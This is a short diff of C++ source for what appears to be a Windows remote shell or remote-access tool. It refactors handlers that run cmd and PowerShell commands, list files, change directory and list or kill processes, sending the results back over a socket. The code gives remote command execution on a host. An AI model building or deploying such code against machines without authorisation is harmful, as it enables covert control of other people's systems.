@@ -37,7 +37,7 @@ void Shell::pwd(SOCKET* client)
 void Shell::ls(SOCKET* client)
 {
 	std::string ret = return_command("dir /b");
-	send(*client, ("\n"+ret).c_str(), BUFFER_LEN, 0);
+	Transfer::sendString(client, ret);
 }
 void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 {
@@ -50,8 +50,7 @@ void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 	std::cout << ret << std::endl;
 	if (ret != "") 
 	{ 
-		
-		send(*client, ret.c_str(), BUFFER_LEN, 0); 
+		Transfer::sendString(client, ret);
 	}
 }
 void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
@@ -64,15 +63,23 @@ void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 	std::string ret = Shell::return_command(cmd).c_str();
 	if (ret != "") 
 	{
-
-		send(*client, ret.c_str(), BUFFER_LEN, 0);
+		Transfer::sendString(client, ret);
 	}
 }
-void Shell::cd( const std::string directory)
+void Shell::cd(Client* client, const std::string directory)
 {
 	int ret = _chdir(directory.c_str());
-	std::cout << "Ret : " << ret;
+	if (ret == -1)
+	{
+		client->send_b(("Unable to find directory : " + directory).c_str());
+	}
+	else if (ret == 0)
+	{
+		client->send_b(("Directory changed to : " + directory).c_str());
+	}
 }
+
+
 void Shell::uploadToClientExe(Client* client, std::string filename)
 {
 	if (Transfer::uploadToClient(client, filename))
@@ -111,8 +118,7 @@ void Shell::ps(Client* client)
 	std::cout << ret << std::endl;
 	if (ret != "")
 	{
-		send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
-		send(*client->getSock(), ret.c_str(), HUGE, 0);
+		Transfer::sendString(client->getSock(),ret);
 	}
 }
 void Shell::kill(Client* client, const std::vector<std::string> args)
